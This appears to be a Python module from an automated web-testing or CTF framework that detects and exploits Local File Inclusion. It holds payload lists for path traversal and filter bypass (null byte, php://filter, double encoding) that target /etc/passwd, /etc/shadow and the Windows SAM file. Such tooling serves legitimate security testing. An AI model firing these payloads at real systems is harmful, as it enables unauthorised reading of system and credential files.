"""Local File Inclusion detection and exploitation trees (W-LFI-Detect & W-LFI-Exploit).

Implements LFI detection from detections.md:
- W-L.1: Traversal probe (known file paths)
- W-L.2: Filter-aware tests (null bytes, wrappers, etc.)
"""
from typing import Dict, Any, Optional, List
import logging
import urllib.parse

from lattice_mind.core.nodes import DecisionNode
from lattice_mind.core.types import (
    NodeResult, NodeStatus, VulnDescriptor, VulnType
)
from lattice_mind.adapters.curl_adapter import CurlAdapter

logger = logging.getLogger(__name__)


class LFIDetectTraversalNode(DecisionNode):
    """W-L.1: LFI traversal path probes."""
    
    def __init__(self):
        super().__init__("lfi_detect_traversal", "LFI: Traversal Probes")
        self.curl = CurlAdapter()
    
    def run(self, context: Dict[str, Any]) -> NodeResult:
        """Test LFI with path traversal sequences."""
        challenge = context.get("challenge")
        target_param = context.get("target_param")
        
        if not challenge or not target_param:
            return NodeResult(status=NodeStatus.FAILURE, error="Missing context")
        
        param_name = target_param.get("name")
        endpoint = target_param.get("endpoint", challenge.url)
        
        logger.info(f"[lfi] Testing path traversal on {param_name}")
        
        # Common files to try reading
        lfi_paths = [
            "../../../../../../../etc/passwd",
            "../../../../../../etc/passwd",
            "/etc/passwd",
            "..\\..\\..\\..\\windows\\win.ini",
            "..\\..\\..\\..\\boot.ini",
            "/windows/system32/config/sam",
            "/etc/shadow",
        ]
        
        # File signatures to detect
        signatures = {
            "root:": "Unix /etc/passwd",
            "daemon:": "Unix /etc/passwd",
            "[boot loader]": "Windows boot.ini",
            "[operating systems]": "Windows boot.ini",
            "[files]": "Windows win.ini",
        }
        
        try:
            for path in lfi_paths:
                # Try various encoding schemes
                payloads = [
                    path,  # Direct
                    urllib.parse.quote(path),  # URL encoded
                    path.replace("/", "%2f"),  # Encoded slashes
                ]
                
                for payload in payloads:
                    url = f"{endpoint}?{param_name}={payload}"
                    result = self.curl.run(url, {})
                    body = result.get("body", "")
                    
                    # Check for known file signatures
                    for sig, file_type in signatures.items():
                        if sig in body:
                            logger.info(f"[lfi] Found {file_type} via {path}")
                            return NodeResult(
                                status=NodeStatus.SUCCESS,
                                data={
                                    "is_lfi": True,
                                    "file_type": file_type,
                                    "path": path,
                                    "file_content": body[:500],  # First 500 chars
                                }
                            )
            
            return NodeResult(
                status=NodeStatus.SUCCESS,
                data={"is_lfi": False}
            )
        
        except Exception as e:
            logger.error(f"[lfi] Traversal test failed: {str(e)}")
            return NodeResult(status=NodeStatus.FAILURE, error=str(e))
    
    def next_node(self, result: NodeResult) -> Optional[DecisionNode]:
        if result.status == NodeStatus.SUCCESS:
            if result.data.get("is_lfi"):
                return LFIExploitTraversalNode()
            else:
                return LFIDetectFilterNode()
        return None


class LFIDetectFilterNode(DecisionNode):
    """W-L.2: LFI with filter bypass techniques."""
    
    def __init__(self):
        super().__init__("lfi_detect_filter", "LFI: Filter Bypass")
        self.curl = CurlAdapter()
    
    def run(self, context: Dict[str, Any]) -> NodeResult:
        """Test LFI bypass techniques: null bytes, wrappers, encoding."""
        challenge = context.get("challenge")
        target_param = context.get("target_param")
        
        if not challenge or not target_param:
            return NodeResult(status=NodeStatus.FAILURE, error="Missing context")
        
        param_name = target_param.get("name")
        endpoint = target_param.get("endpoint", challenge.url)
        
        logger.info(f"[lfi] Testing filter bypass techniques on {param_name}")
        
        # Bypass techniques
        bypass_payloads = [
            # Null byte bypass (PHP < 5.3)
            "file:///etc/passwd%00",
            # Wrapper bypass
            "php://filter/convert.base64-encode/resource=/etc/passwd",
            "data://text/plain,Hello%20World",
            # Case variation
            "..\\..\\..\\..\\windows\\win.ini",
            # Double encoding
            "..%252f..%252f..%252fetc%252fpasswd",
            # Case variation with traversal
            "../../../etc/passwd",
            "....//....//....//etc/passwd",
        ]
        
        signatures = {
            "root:": "Unix /etc/passwd",
            "[boot loader]": "Windows config",
        }
        
        try:
            for payload in bypass_payloads:
                url = f"{endpoint}?{param_name}={payload}"
                result = self.curl.run(url, {})
                body = result.get("body", "")
                
                # Check for signatures
                for sig, file_type in signatures.items():
                    if sig in body:
                        logger.info(f"[lfi] Filter bypass successful with: {payload}")
                        return NodeResult(
                            status=NodeStatus.SUCCESS,
                            data={
                                "is_lfi_filtered": True,
                                "bypass_technique": payload,
                                "file_content": body[:500],
                            }
                        )
            
            return NodeResult(
                status=NodeStatus.SUCCESS,
                data={"is_lfi_filtered": False}
            )
        
        except Exception as e:
            logger.error(f"[lfi] Filter bypass test failed: {str(e)}")
            return NodeResult(status=NodeStatus.FAILURE, error=str(e))


class LFIExploitTraversalNode(DecisionNode):
    """Exploit basic LFI to read arbitrary files."""
    
    def __init__(self):
        super().__init__("lfi_exploit_traversal", "LFI: Exploit Traversal")
        self.curl = CurlAdapter()
    
    def run(self, context: Dict[str, Any]) -> NodeResult:
        """Use LFI to read arbitrary files from the target."""
        logger.info(f"[lfi] Exploiting basic LFI traversal")
        
        # In real scenario, would enumerate and read interesting files
        # like /etc/passwd, config files, source code, etc.
        
        return NodeResult(
            status=NodeStatus.SUCCESS,
            data={
                "exploitation": "traversal",
                "readable_files": [
                    "/etc/passwd",
                    "config files",
                    "application source",
                ]
            }
        )


# Summary
"""
Local File Inclusion Detection Trees (W-LFI)

Detection nodes:
- W-L.1 (LFIDetectTraversalNode) - Basic path traversal
- W-L.2 (LFIDetectFilterNode) - Filter bypass techniques

Exploitation nodes:
- LFIExploitTraversalNode - Read arbitrary files

File signatures detected:
- /etc/passwd (root:, daemon:)
- /windows/boot.ini ([boot loader])
- /windows/win.ini ([files])

Used by web reconnaissance to test file path parameters.
"""
